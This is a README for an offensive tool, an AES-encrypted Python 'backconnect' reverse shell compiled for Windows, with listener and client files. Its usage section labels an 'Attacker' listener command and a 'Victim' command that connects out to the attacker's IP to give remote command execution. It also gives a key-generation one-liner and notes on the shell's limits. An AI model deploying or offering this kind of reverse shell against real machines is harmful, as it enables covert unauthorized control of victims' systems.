Bright side
-----------
Python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
- running on windows and unix (mac untested)
- compiles with pyinstaller under windows, so no python installation needed
- change crypto key in both files
 -> python2 -c 'import aes;aye = aes.Crypticle.generate_key_string();print "Set new key: ", aye'

Usage
-----
Attacker:
shell > ./listen.py 0.0.0.0 1443

Victim:
C:\bc.exe 192.168.1.1 1443

Files
-----
bc.py - the backconnect shell
bc.exe - compiled with pyinstaller for windows (Tested: WinXP/Win7)
listen.py - the listener shell
aes.py - crypto import

WARNING
-------
Warning! This will *NOT* spawn a fully featured shell on windows or unix.
While unix will be added soon, it seems to be quite complicated getting it done
under Windows without digging deeper.

As this tool pipes commands to the command interpreter of the remote system
DO NOT try to execute cmd.exe or bash or vi. Your pseudo shell will hang.
